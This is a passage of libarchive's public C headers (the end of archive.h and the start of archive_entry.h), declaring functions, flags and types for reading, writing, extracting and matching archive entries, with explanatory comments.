#define	ARCHIVE_EXTRACT_XATTR 			(0x0080)
/* Default: Do not try to guard against extracts redirected by symlinks. */
/* Note: With ARCHIVE_EXTRACT_UNLINK, will remove any intermediate symlink. */
#define	ARCHIVE_EXTRACT_SECURE_SYMLINKS		(0x0100)
/* Default: Do not reject entries with '..' as path elements. */
#define	ARCHIVE_EXTRACT_SECURE_NODOTDOT		(0x0200)
/* Default: Create parent directories as needed. */
#define	ARCHIVE_EXTRACT_NO_AUTODIR		(0x0400)
/* Default: Overwrite files, even if one on disk is newer. */
#define	ARCHIVE_EXTRACT_NO_OVERWRITE_NEWER	(0x0800)
/* Detect blocks of 0 and write holes instead. */
#define	ARCHIVE_EXTRACT_SPARSE			(0x1000)
/* Default: Do not restore Mac extended metadata. */
/* This has no effect except on Mac OS. */
#define	ARCHIVE_EXTRACT_MAC_METADATA		(0x2000)
/* Default: Use HFS+ compression if it was compressed. */
/* This has no effect except on Mac OS v10.6 or later. */
#define	ARCHIVE_EXTRACT_NO_HFS_COMPRESSION	(0x4000)
/* Default: Do not use HFS+ compression if it was not compressed. */
/* This has no effect except on Mac OS v10.6 or later. */
#define	ARCHIVE_EXTRACT_HFS_COMPRESSION_FORCED	(0x8000)
/* Default: Do not reject entries with absolute paths */
#define ARCHIVE_EXTRACT_SECURE_NOABSOLUTEPATHS (0x10000)
/* Default: Do not clear no-change flags when unlinking object */
#define	ARCHIVE_EXTRACT_CLEAR_NOCHANGE_FFLAGS	(0x20000)
/* Default: Do not extract atomically (using rename) */
#define	ARCHIVE_EXTRACT_SAFE_WRITES		(0x40000)

__LA_DECL int archive_read_extract(struct archive *, struct archive_entry *,
			 int flags);
__LA_DECL int archive_read_extract2(struct archive *, struct archive_entry *,
			 struct archive * /* dest */);
__LA_DECL void	 archive_read_extract_set_progress_callback(struct archive *,
			 void (*_progress_func)(void *), void *_user_data);

/* Record the dev/ino of a file that will not be written.  This is
 * generally set to the dev/ino of the archive being read. */
__LA_DECL void		archive_read_extract_set_skip_file(struct archive *,
			 la_int64_t, la_int64_t);

/* Close the file and release most resources. */
__LA_DECL int		 archive_read_close(struct archive *);
/* Release all resources and destroy the object. */
/* Note that archive_read_free will call archive_read_close for you. */
__LA_DECL int		 archive_read_free(struct archive *);
#if ARCHIVE_VERSION_NUMBER < 4000000
/* Synonym for archive_read_free() for backwards compatibility. */
__LA_DECL int		 archive_read_finish(struct archive *) __LA_DEPRECATED;
#endif

/*-
 * To create an archive:
 *   1) Ask archive_write_new for an archive writer object.
 *   2) Set any global properties.  In particular, you should set
 *      the compression and format to use.
 *   3) Call archive_write_open to open the file (most people
 *       will use archive_write_open_file or archive_write_open_fd,
 *       which provide convenient canned I/O callbacks for you).
 *   4) For each entry:
 *      - construct an appropriate struct archive_entry structure
 *      - archive_write_header to write the header
 *      - archive_write_data to write the entry data
 *   5) archive_write_close to close the output
 *   6) archive_write_free to cleanup the writer and release resources
 */
__LA_DECL struct archive	*archive_write_new(void);
__LA_DECL int archive_write_set_bytes_per_block(struct archive *,
			 int bytes_per_block);
__LA_DECL int archive_write_get_bytes_per_block(struct archive *);
/* XXX This is badly misnamed; suggestions appreciated. XXX */
__LA_DECL int archive_write_set_bytes_in_last_block(struct archive *,
			 int bytes_in_last_block);
__LA_DECL int archive_write_get_bytes_in_last_block(struct archive *);

/* The dev/ino of a file that won't be archived.  This is used
 * to avoid recursively adding an archive to itself. */
__LA_DECL int archive_write_set_skip_file(struct archive *,
	la_int64_t, la_int64_t);

#if ARCHIVE_VERSION_NUMBER < 4000000
__LA_DECL int archive_write_set_compression_bzip2(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_compress(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_gzip(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_lzip(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_lzma(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_none(struct archive *)
		__LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_program(struct archive *,
			 const char *cmd) __LA_DEPRECATED;
__LA_DECL int archive_write_set_compression_xz(struct archive *)
		__LA_DEPRECATED;
#endif

/* A convenience function to set the filter based on the code. */
__LA_DECL int archive_write_add_filter(struct archive *, int filter_code);
__LA_DECL int archive_write_add_filter_by_name(struct archive *,
			 const char *name);
__LA_DECL int archive_write_add_filter_b64encode(struct archive *);
__LA_DECL int archive_write_add_filter_bzip2(struct archive *);
__LA_DECL int archive_write_add_filter_compress(struct archive *);
__LA_DECL int archive_write_add_filter_grzip(struct archive *);
__LA_DECL int archive_write_add_filter_gzip(struct archive *);
__LA_DECL int archive_write_add_filter_lrzip(struct archive *);
__LA_DECL int archive_write_add_filter_lz4(struct archive *);
__LA_DECL int archive_write_add_filter_lzip(struct archive *);
__LA_DECL int archive_write_add_filter_lzma(struct archive *);
__LA_DECL int archive_write_add_filter_lzop(struct archive *);
__LA_DECL int archive_write_add_filter_none(struct archive *);
__LA_DECL int archive_write_add_filter_program(struct archive *,
			 const char *cmd);
__LA_DECL int archive_write_add_filter_uuencode(struct archive *);
__LA_DECL int archive_write_add_filter_xz(struct archive *);
__LA_DECL int archive_write_add_filter_zstd(struct archive *);


/* A convenience function to set the format based on the code or name. */
__LA_DECL int archive_write_set_format(struct archive *, int format_code);
__LA_DECL int archive_write_set_format_by_name(struct archive *,
			 const char *name);
/* To minimize link pollution, use one or more of the following. */
__LA_DECL int archive_write_set_format_7zip(struct archive *);
__LA_DECL int archive_write_set_format_ar_bsd(struct archive *);
__LA_DECL int archive_write_set_format_ar_svr4(struct archive *);
__LA_DECL int archive_write_set_format_cpio(struct archive *);
__LA_DECL int archive_write_set_format_cpio_bin(struct archive *);
__LA_DECL int archive_write_set_format_cpio_newc(struct archive *);
__LA_DECL int archive_write_set_format_cpio_odc(struct archive *);
__LA_DECL int archive_write_set_format_cpio_pwb(struct archive *);
__LA_DECL int archive_write_set_format_gnutar(struct archive *);
__LA_DECL int archive_write_set_format_iso9660(struct archive *);
__LA_DECL int archive_write_set_format_mtree(struct archive *);
__LA_DECL int archive_write_set_format_mtree_classic(struct archive *);
/* TODO: int archive_write_set_format_old_tar(struct archive *); */
__LA_DECL int archive_write_set_format_pax(struct archive *);
__LA_DECL int archive_write_set_format_pax_restricted(struct archive *);
__LA_DECL int archive_write_set_format_raw(struct archive *);
__LA_DECL int archive_write_set_format_shar(struct archive *);
__LA_DECL int archive_write_set_format_shar_dump(struct archive *);
__LA_DECL int archive_write_set_format_ustar(struct archive *);
__LA_DECL int archive_write_set_format_v7tar(struct archive *);
__LA_DECL int archive_write_set_format_warc(struct archive *);
__LA_DECL int archive_write_set_format_xar(struct archive *);
__LA_DECL int archive_write_set_format_zip(struct archive *);
__LA_DECL int archive_write_set_format_filter_by_ext(struct archive *a, const char *filename);
__LA_DECL int archive_write_set_format_filter_by_ext_def(struct archive *a, const char *filename, const char * def_ext);
__LA_DECL int archive_write_zip_set_compression_deflate(struct archive *);
__LA_DECL int archive_write_zip_set_compression_store(struct archive *);
/* Deprecated; use archive_write_open2 instead */
__LA_DECL int archive_write_open(struct archive *, void *,
			 archive_open_callback *, archive_write_callback *,
			 archive_close_callback *);
__LA_DECL int archive_write_open2(struct archive *, void *,
			 archive_open_callback *, archive_write_callback *,
			 archive_close_callback *, archive_free_callback *);
__LA_DECL int archive_write_open_fd(struct archive *, int _fd);
__LA_DECL int archive_write_open_filename(struct archive *, const char *_file);
__LA_DECL int archive_write_open_filename_w(struct archive *,
			 const wchar_t *_file);
/* A deprecated synonym for archive_write_open_filename() */
__LA_DECL int archive_write_open_file(struct archive *, const char *_file)
		__LA_DEPRECATED;
__LA_DECL int archive_write_open_FILE(struct archive *, FILE *);
/* _buffSize is the size of the buffer, _used refers to a variable that
 * will be updated after each write into the buffer. */
__LA_DECL int archive_write_open_memory(struct archive *,
			void *_buffer, size_t _buffSize, size_t *_used);

/*
 * Note that the library will truncate writes beyond the size provided
 * to archive_write_header or pad if the provided data is short.
 */
__LA_DECL int archive_write_header(struct archive *,
			 struct archive_entry *);
__LA_DECL la_ssize_t	archive_write_data(struct archive *,
				const void *, size_t);

/* This interface is currently only available for archive_write_disk handles.  */
__LA_DECL la_ssize_t	 archive_write_data_block(struct archive *,
					const void *, size_t, la_int64_t);

__LA_DECL int		 archive_write_finish_entry(struct archive *);
__LA_DECL int		 archive_write_close(struct archive *);
/* Marks the archive as FATAL so that a subsequent free() operation
 * won't try to close() cleanly.  Provides a fast abort capability
 * when the client discovers that things have gone wrong. */
__LA_DECL int            archive_write_fail(struct archive *);
/* This can fail if the archive wasn't already closed, in which case
 * archive_write_free() will implicitly call archive_write_close(). */
__LA_DECL int		 archive_write_free(struct archive *);
#if ARCHIVE_VERSION_NUMBER < 4000000
/* Synonym for archive_write_free() for backwards compatibility. */
__LA_DECL int		 archive_write_finish(struct archive *) __LA_DEPRECATED;
#endif

/*
 * Set write options.
 */
/* Apply option to the format only. */
__LA_DECL int archive_write_set_format_option(struct archive *_a,
				const char *m, const char *o,
				const char *v);
/* Apply option to the filter only. */
__LA_DECL int archive_write_set_filter_option(struct archive *_a,
				const char *m, const char *o,
				const char *v);
/* Apply option to both the format and the filter. */
__LA_DECL int archive_write_set_option(struct archive *_a,
				const char *m, const char *o,
				const char *v);
/* Apply option string to both the format and the filter. */
__LA_DECL int archive_write_set_options(struct archive *_a,
				const char *opts);

/*
 * Set a encryption passphrase.
 */
__LA_DECL int archive_write_set_passphrase(struct archive *_a, const char *p);
__LA_DECL int archive_write_set_passphrase_callback(struct archive *,
				void *client_data, archive_passphrase_callback *);

/*-
 * ARCHIVE_WRITE_DISK API
 *
 * To create objects on disk:
 *   1) Ask archive_write_disk_new for a new archive_write_disk object.
 *   2) Set any global properties.  In particular, you probably
 *      want to set the options.
 *   3) For each entry:
 *      - construct an appropriate struct archive_entry structure
 *      - archive_write_header to create the file/dir/etc on disk
 *      - archive_write_data to write the entry data
 *   4) archive_write_free to cleanup the writer and release resources
 *
 * In particular, you can use this in conjunction with archive_read()
 * to pull entries out of an archive and create them on disk.
 */
__LA_DECL struct archive	*archive_write_disk_new(void);
/* This file will not be overwritten. */
__LA_DECL int archive_write_disk_set_skip_file(struct archive *,
	la_int64_t, la_int64_t);
/* Set flags to control how the next item gets created.
 * This accepts a bitmask of ARCHIVE_EXTRACT_XXX flags defined above. */
__LA_DECL int		 archive_write_disk_set_options(struct archive *,
			 int flags);
/*
 * The lookup functions are given uname/uid (or gname/gid) pairs and
 * return a uid (gid) suitable for this system.  These are used for
 * restoring ownership and for setting ACLs.  The default functions
 * are naive, they just return the uid/gid.  These are small, so reasonable
 * for applications that don't need to preserve ownership; they
 * are probably also appropriate for applications that are doing
 * same-system backup and restore.
 */
/*
 * The "standard" lookup functions use common system calls to lookup
 * the uname/gname, falling back to the uid/gid if the names can't be
 * found.  They cache lookups and are reasonably fast, but can be very
 * large, so they are not used unless you ask for them.  In
 * particular, these match the specifications of POSIX "pax" and old
 * POSIX "tar".
 */
__LA_DECL int	 archive_write_disk_set_standard_lookup(struct archive *);
/*
 * If neither the default (naive) nor the standard (big) functions suit
 * your needs, you can write your own and register them.  Be sure to
 * include a cleanup function if you have allocated private data.
 */
__LA_DECL int archive_write_disk_set_group_lookup(struct archive *,
	void * /* private_data */,
	la_int64_t (*)(void *, const char *, la_int64_t),
	void (* /* cleanup */)(void *));
__LA_DECL int archive_write_disk_set_user_lookup(struct archive *,
	void * /* private_data */,
	la_int64_t (*)(void *, const char *, la_int64_t),
	void (* /* cleanup */)(void *));
__LA_DECL la_int64_t archive_write_disk_gid(struct archive *, const char *, la_int64_t);
__LA_DECL la_int64_t archive_write_disk_uid(struct archive *, const char *, la_int64_t);

/*
 * ARCHIVE_READ_DISK API
 *
 * This is still evolving and somewhat experimental.
 */
__LA_DECL struct archive *archive_read_disk_new(void);
/* The names for symlink modes here correspond to an old BSD
 * command-line argument convention: -L, -P, -H */
/* Follow all symlinks. */
__LA_DECL int archive_read_disk_set_symlink_logical(struct archive *);
/* Follow no symlinks. */
__LA_DECL int archive_read_disk_set_symlink_physical(struct archive *);
/* Follow symlink initially, then not. */
__LA_DECL int archive_read_disk_set_symlink_hybrid(struct archive *);
/* TODO: Handle Linux stat32/stat64 ugliness. <sigh> */
__LA_DECL int archive_read_disk_entry_from_file(struct archive *,
	struct archive_entry *, int /* fd */, const struct stat *);
/* Look up gname for gid or uname for uid. */
/* Default implementations are very, very stupid. */
__LA_DECL const char *archive_read_disk_gname(struct archive *, la_int64_t);
__LA_DECL const char *archive_read_disk_uname(struct archive *, la_int64_t);
/* "Standard" implementation uses getpwuid_r, getgrgid_r and caches the
 * results for performance. */
__LA_DECL int	archive_read_disk_set_standard_lookup(struct archive *);
/* You can install your own lookups if you like. */
__LA_DECL int	archive_read_disk_set_gname_lookup(struct archive *,
	void * /* private_data */,
	const char *(* /* lookup_fn */)(void *, la_int64_t),
	void (* /* cleanup_fn */)(void *));
__LA_DECL int	archive_read_disk_set_uname_lookup(struct archive *,
	void * /* private_data */,
	const char *(* /* lookup_fn */)(void *, la_int64_t),
	void (* /* cleanup_fn */)(void *));
/* Start traversal. */
__LA_DECL int	archive_read_disk_open(struct archive *, const char *);
__LA_DECL int	archive_read_disk_open_w(struct archive *, const wchar_t *);
/*
 * Request that current entry be visited.  If you invoke it on every
 * directory, you'll get a physical traversal.  This is ignored if the
 * current entry isn't a directory or a link to a directory.  So, if
 * you invoke this on every returned path, you'll get a full logical
 * traversal.
 */
__LA_DECL int	archive_read_disk_descend(struct archive *);
__LA_DECL int	archive_read_disk_can_descend(struct archive *);
__LA_DECL int	archive_read_disk_current_filesystem(struct archive *);
__LA_DECL int	archive_read_disk_current_filesystem_is_synthetic(struct archive *);
__LA_DECL int	archive_read_disk_current_filesystem_is_remote(struct archive *);
/* Request that the access time of the entry visited by traversal be restored. */
__LA_DECL int  archive_read_disk_set_atime_restored(struct archive *);
/*
 * Set behavior. The "flags" argument selects optional behavior.
 */
/* Request that the access time of the entry visited by traversal be restored.
 * This is the same as archive_read_disk_set_atime_restored. */
#define	ARCHIVE_READDISK_RESTORE_ATIME		(0x0001)
/* Default: Do not skip an entry which has nodump flags. */
#define	ARCHIVE_READDISK_HONOR_NODUMP		(0x0002)
/* Default: Skip a mac resource fork file whose prefix is "._" because of
 * using copyfile. */
#define	ARCHIVE_READDISK_MAC_COPYFILE		(0x0004)
/* Default: Traverse mount points. */
#define	ARCHIVE_READDISK_NO_TRAVERSE_MOUNTS	(0x0008)
/* Default: Xattrs are read from disk. */
#define	ARCHIVE_READDISK_NO_XATTR		(0x0010)
/* Default: ACLs are read from disk. */
#define	ARCHIVE_READDISK_NO_ACL			(0x0020)
/* Default: File flags are read from disk. */
#define	ARCHIVE_READDISK_NO_FFLAGS		(0x0040)
/* Default: Sparse file information is read from disk. */
#define	ARCHIVE_READDISK_NO_SPARSE		(0x0080)

__LA_DECL int  archive_read_disk_set_behavior(struct archive *,
			int flags);

/*
 * Set archive_match object that will be used in archive_read_disk to
 * know whether an entry should be skipped. The callback function
 * _excluded_func will be invoked when an entry is skipped by the result
 * of archive_match.
 */
__LA_DECL int	archive_read_disk_set_matching(struct archive *,
			struct archive *_matching, void (*_excluded_func)
			(struct archive *, void *, struct archive_entry *),
			void *_client_data);
__LA_DECL int	archive_read_disk_set_metadata_filter_callback(struct archive *,
			int (*_metadata_filter_func)(struct archive *, void *,
				struct archive_entry *), void *_client_data);

/* Simplified cleanup interface;
 * This calls archive_read_free() or archive_write_free() as needed. */
__LA_DECL int	archive_free(struct archive *);

/*
 * Accessor functions to read/set various information in
 * the struct archive object:
 */

/* Number of filters in the current filter pipeline. */
/* Filter #0 is the one closest to the format, -1 is a synonym for the
 * last filter, which is always the pseudo-filter that wraps the
 * client callbacks. */
__LA_DECL int		 archive_filter_count(struct archive *);
__LA_DECL la_int64_t	 archive_filter_bytes(struct archive *, int);
__LA_DECL int		 archive_filter_code(struct archive *, int);
__LA_DECL const char *	 archive_filter_name(struct archive *, int);

#if ARCHIVE_VERSION_NUMBER < 4000000
/* These don't properly handle multiple filters, so are deprecated and
 * will eventually be removed. */
/* As of libarchive 3.0, this is an alias for archive_filter_bytes(a, -1); */
__LA_DECL la_int64_t	 archive_position_compressed(struct archive *)
				__LA_DEPRECATED;
/* As of libarchive 3.0, this is an alias for archive_filter_bytes(a, 0); */
__LA_DECL la_int64_t	 archive_position_uncompressed(struct archive *)
				__LA_DEPRECATED;
/* As of libarchive 3.0, this is an alias for archive_filter_name(a, 0); */
__LA_DECL const char	*archive_compression_name(struct archive *)
				__LA_DEPRECATED;
/* As of libarchive 3.0, this is an alias for archive_filter_code(a, 0); */
__LA_DECL int		 archive_compression(struct archive *)
				__LA_DEPRECATED;
#endif

__LA_DECL int		 archive_errno(struct archive *);
__LA_DECL const char	*archive_error_string(struct archive *);
__LA_DECL const char	*archive_format_name(struct archive *);
__LA_DECL int		 archive_format(struct archive *);
__LA_DECL void		 archive_clear_error(struct archive *);
__LA_DECL void		 archive_set_error(struct archive *, int _err,
				const char *fmt, ...) __LA_PRINTF(3, 4);
__LA_DECL void		 archive_copy_error(struct archive *dest,
				struct archive *src);
__LA_DECL int		 archive_file_count(struct archive *);

/*
 * ARCHIVE_MATCH API
 */
__LA_DECL struct archive *archive_match_new(void);
__LA_DECL int	archive_match_free(struct archive *);

/*
 * Test if archive_entry is excluded.
 * This is a convenience function. This is the same as calling all
 * archive_match_path_excluded, archive_match_time_excluded
 * and archive_match_owner_excluded.
 */
__LA_DECL int	archive_match_excluded(struct archive *,
			struct archive_entry *);

/*
 * Test if pathname is excluded. The conditions are set by following functions.
 */
__LA_DECL int	archive_match_path_excluded(struct archive *,
			struct archive_entry *);
/* Control recursive inclusion of directory content when directory is included. Default on. */
__LA_DECL int	archive_match_set_inclusion_recursion(struct archive *, int);
/* Add exclusion pathname pattern. */
__LA_DECL int	archive_match_exclude_pattern(struct archive *, const char *);
__LA_DECL int	archive_match_exclude_pattern_w(struct archive *,
			const wchar_t *);
/* Add exclusion pathname pattern from file. */
__LA_DECL int	archive_match_exclude_pattern_from_file(struct archive *,
			const char *, int _nullSeparator);
__LA_DECL int	archive_match_exclude_pattern_from_file_w(struct archive *,
			const wchar_t *, int _nullSeparator);
/* Add inclusion pathname pattern. */
__LA_DECL int	archive_match_include_pattern(struct archive *, const char *);
__LA_DECL int	archive_match_include_pattern_w(struct archive *,
			const wchar_t *);
/* Add inclusion pathname pattern from file. */
__LA_DECL int	archive_match_include_pattern_from_file(struct archive *,
			const char *, int _nullSeparator);
__LA_DECL int	archive_match_include_pattern_from_file_w(struct archive *,
			const wchar_t *, int _nullSeparator);
/*
 * How to get statistic information for inclusion patterns.
 */
/* Return the amount number of unmatched inclusion patterns. */
__LA_DECL int	archive_match_path_unmatched_inclusions(struct archive *);
/* Return the pattern of unmatched inclusion with ARCHIVE_OK.
 * Return ARCHIVE_EOF if there is no inclusion pattern. */
__LA_DECL int	archive_match_path_unmatched_inclusions_next(
			struct archive *, const char **);
__LA_DECL int	archive_match_path_unmatched_inclusions_next_w(
			struct archive *, const wchar_t **);

/*
 * Test if a file is excluded by its time stamp.
 * The conditions are set by following functions.
 */
__LA_DECL int	archive_match_time_excluded(struct archive *,
			struct archive_entry *);

/*
 * Flags to tell a matching type of time stamps. These are used for
 * following functions.
 */
/* Time flag: mtime to be tested. */
#define ARCHIVE_MATCH_MTIME	(0x0100)
/* Time flag: ctime to be tested. */
#define ARCHIVE_MATCH_CTIME	(0x0200)
/* Comparison flag: Match the time if it is newer than. */
#define ARCHIVE_MATCH_NEWER	(0x0001)
/* Comparison flag: Match the time if it is older than. */
#define ARCHIVE_MATCH_OLDER	(0x0002)
/* Comparison flag: Match the time if it is equal to. */
#define ARCHIVE_MATCH_EQUAL	(0x0010)
/* Set inclusion time. */
__LA_DECL int	archive_match_include_time(struct archive *, int _flag,
			time_t _sec, long _nsec);
/* Set inclusion time by a date string. */
__LA_DECL int	archive_match_include_date(struct archive *, int _flag,
			const char *_datestr);
__LA_DECL int	archive_match_include_date_w(struct archive *, int _flag,
			const wchar_t *_datestr);
/* Set inclusion time by a particular file. */
__LA_DECL int	archive_match_include_file_time(struct archive *,
			int _flag, const char *_pathname);
__LA_DECL int	archive_match_include_file_time_w(struct archive *,
			int _flag, const wchar_t *_pathname);
/* Add exclusion entry. */
__LA_DECL int	archive_match_exclude_entry(struct archive *,
			int _flag, struct archive_entry *);

/*
 * Test if a file is excluded by its uid ,gid, uname or gname.
 * The conditions are set by following functions.
 */
__LA_DECL int	archive_match_owner_excluded(struct archive *,
			struct archive_entry *);
/* Add inclusion uid, gid, uname and gname. */
__LA_DECL int	archive_match_include_uid(struct archive *, la_int64_t);
__LA_DECL int	archive_match_include_gid(struct archive *, la_int64_t);
__LA_DECL int	archive_match_include_uname(struct archive *, const char *);
__LA_DECL int	archive_match_include_uname_w(struct archive *,
			const wchar_t *);
__LA_DECL int	archive_match_include_gname(struct archive *, const char *);
__LA_DECL int	archive_match_include_gname_w(struct archive *,
			const wchar_t *);

/* Utility functions */
/* Convenience function to sort a NULL terminated list of strings */
__LA_DECL int archive_utility_string_sort(char **);

#ifdef __cplusplus
}
#endif

/* These are meaningless outside of this header. */
#undef __LA_DECL

#endif /* !ARCHIVE_H_INCLUDED */

```

`BaseBin/_external/include/libarchive/archive_entry.h`:

```h
/*-
 * Copyright (c) 2003-2008 Tim Kientzle
 * Copyright (c) 2016 Martin Matuska
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR(S) ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR(S) BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * $FreeBSD: head/lib/libarchive/archive_entry.h 201096 2009-12-28 02:41:27Z kientzle $
 */

#ifndef ARCHIVE_ENTRY_H_INCLUDED
#define	ARCHIVE_ENTRY_H_INCLUDED

/* Note: Compiler will complain if this does not match archive.h! */
#define	ARCHIVE_VERSION_NUMBER 3006002

/*
 * Note: archive_entry.h is for use outside of libarchive; the
 * configuration headers (config.h, archive_platform.h, etc.) are
 * purely internal.  Do NOT use HAVE_XXX configuration macros to
 * control the behavior of this header!  If you must conditionalize,
 * use predefined compiler and/or platform macros.
 */

#include <sys/types.h>
#include <stddef.h>  /* for wchar_t */
#include <stdint.h>
#include <time.h>

#if defined(_WIN32) && !defined(__CYGWIN__)
#include <windows.h>
#endif

/* Get a suitable 64-bit integer type. */
#if !defined(__LA_INT64_T_DEFINED)
# if ARCHIVE_VERSION_NUMBER < 4000000
#define __LA_INT64_T la_int64_t
# endif
#define __LA_INT64_T_DEFINED
# if defined(_WIN32) && !defined(__CYGWIN__) && !defined(__WATCOMC__)
typedef __int64 la_int64_t;
# else
#include <unistd.h>
#  if defined(_SCO_DS) || defined(__osf__)
typedef long long la_int64_t;
#  else
typedef int64_t la_int64_t;
#  endif
# endif
#endif

/* The la_ssize_t should match the type used in 'struct stat' */
#if !defined(__LA_SSIZE_T_DEFINED)
/* Older code relied on the __LA_SSIZE_T macro; after 4.0 we'll switch to the typedef exclusively. */
# if ARCHIVE_VERSION_NUMBER < 4000000
#define __LA_SSIZE_T la_ssize_t
# endif
#define __LA_SSIZE_T_DEFINED
# if defined(_WIN32) && !defined(__CYGWIN__) && !defined(__WATCOMC__)
#  if defined(_SSIZE_T_DEFINED) || defined(_SSIZE_T_)
typedef ssize_t la_ssize_t;
#  elif defined(_WIN64)
typedef __int64 la_ssize_t;
#  else
typedef long la_ssize_t;
#  endif
# else
# include <unistd.h>  /* ssize_t */
typedef ssize_t la_ssize_t;
# endif
#endif

/* Get a suitable definition for mode_t */
#if ARCHIVE_VERSION_NUMBER >= 3999000
/* Switch to plain 'int' for libarchive 4.0.  It's less broken than 'mode_t' */
# define	__LA_MODE_T	int
#elif defined(_WIN32) && !defined(__CYGWIN__) && !defined(__BORLANDC__) && !defined(__WATCOMC__)
# define	__LA_MODE_T	unsigned short
#else
# define	__LA_MODE_T	mode_t
#endif

/* Large file support for Android */
#if defined(__LIBARCHIVE_BUILD) && defined(__ANDROID__)
#include "android_lf.h"
#endif

/*
 * On Windows, define LIBARCHIVE_STATIC if you're building or using a
 * .lib.  The default here assumes you're building a DLL.  Only
 * libarchive source should ever define __LIBARCHIVE_BUILD.
 */
#if ((defined __WIN32__) || (defined _WIN32) || defined(__CYGWIN__)) && (!defined LIBARCHIVE_STATIC)
# ifdef __LIBARCHIVE_BUILD
#  ifdef __GNUC__
#   define __LA_DECL	__attribute__((dllexport)) extern
#  else
#   define __LA_DECL	__declspec(dllexport)
#  endif
# else
#  ifdef __GNUC__
#   define __LA_DECL
#  else
#   define __LA_DECL	__declspec(dllimport)
#  endif
# endif
#else
/* Static libraries on all platforms and shared libraries on non-Windows. */
# define __LA_DECL
#endif

#if defined(__GNUC__) && __GNUC__ >= 3 && __GNUC_MINOR__ >= 1
# define __LA_DEPRECATED __attribute__((deprecated))
#else
# define __LA_DEPRECATED
#endif

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Description of an archive entry.
 *
 * You can think of this as "struct stat" with some text fields added in.
 *
 * TODO: Add "comment", "charset", and possibly other entries that are
 * supported by "pax interchange" format.  However, GNU, ustar, cpio,
 * and other variants don't support these features, so they're not an
 * excruciatingly high priority right now.
 *
 * TODO: "pax interchange" format allows essentially arbitrary
 * key/value attributes to be attached to any entry.  Supporting
 * such extensions may make this library useful for special
 * applications (e.g., a package manager could attach special
 * package-management attributes to each entry).
 */
struct archive;
struct archive_entry;

/*
 * File-type constants.  These are returned from archive_entry_filetype()
 * and passed to archive_entry_set_filetype().
 *
 * These values match S_XXX defines on every platform I've checked,
 * including Windows, AIX, Linux, Solaris, and BSD.  They're
 * (re)defined here because platforms generally don't define the ones
 * they don't support.  For example, Windows doesn't define S_IFLNK or
 * S_IFBLK.  Instead of having a mass of conditional logic and system
 * checks to define any S_XXX values that aren't supported locally,
 * I've just defined a new set of such constants so that
 * libarchive-based applications can manipulate and identify archive
 * entries properly even if the hosting platform can't store them on
 * disk.
 *
 * These values are also used directly within some portable formats,
 * such as cpio.  If you find a platform that varies from these, the
 * correct solution is to leave these alone and translate from these
 * portable values to platform-native values when entries are read from
 * or written to disk.
 */
/*
 * In libarchive 4.0, we can drop the casts here.
 * They're needed to work around Borland C's broken mode_t.
 */
#define AE_IFMT		((__LA_MODE_T)0170000)
#define AE_IFREG	((__LA_MODE_T)0100000)
#define AE_IFLNK	((__LA_MODE_T)0120000)
#define AE_IFSOCK	((__LA_MODE_T)0140000)
#define AE_IFCHR	((__LA_MODE_T)0020000)
#define AE_IFBLK	((__LA_MODE_T)0060000)
#define AE_IFDIR	((__LA_MODE_T)0040000)
#define AE_IFIFO	((__LA_MODE_T)0010000)

/*
 * Symlink types
 */
#define AE_SYMLINK_TYPE_UNDEFINED	0
#define AE_SYMLINK_TYPE_FILE		1
#define AE_SYMLINK_TYPE_DIRECTORY	2

/*
 * Basic object manipulation
 */

__LA_DECL struct archive_entry	*archive_entry_clear(struct archive_entry *);
/* The 'clone' function does a deep copy; all of the strings are copied too. */
__LA_DECL struct archive_entry	*archive_entry_clone(struct archive_entry *);
__LA_DECL void			 archive_entry_free(struct archive_entry *);
__LA_DECL struct archive_entry	*archive_entry_new(void);

/*
 * This form of archive_entry_new2() will pull character-set
 * conversion information from the specified archive handle.  The
 * older archive_entry_new(void) form is equivalent to calling
 * archive_entry_new2(NULL) and will result in the use of an internal
 * default character-set conversion.
 */
__LA_DECL struct archive_entry	*archive_entry_new2(struct archive *);

/*
 * Retrieve fields from an archive_entry.
 *
 * There are a number of implicit conversions among these fields.  For
 * example, if a regular string field is set and you read the _w wide
 * character field, the entry will implicitly convert narrow-to-wide
 * using the current locale.  Similarly, dev values are automatically
 * updated when you write devmajor or devminor and vice versa.
 *
 * In addition, fields can be "set" or "unset."  Unset string fields
 * return NULL, non-string fields have _is_set() functions to test
 * whether they've been set.  You can "unset" a string field by
 * assigning NULL; non-string fields have _unset() functions to
 * unset them.
 *
 * Note: There is one ambiguity in the above; string fields will
 * also return NULL when implicit character set conversions fail.
 * This is usually what you want.
 */
__LA_DECL time_t	 archive_entry_atime(struct archive_entry *);
__LA_DECL long		 archive_entry_atime_nsec(struct archive_entry *);
__LA_DECL int		 archive_entry_atime_is_set(struct archive_entry *);
__LA_DECL time_t	 archive_entry_birthtime(struct archive_entry *);
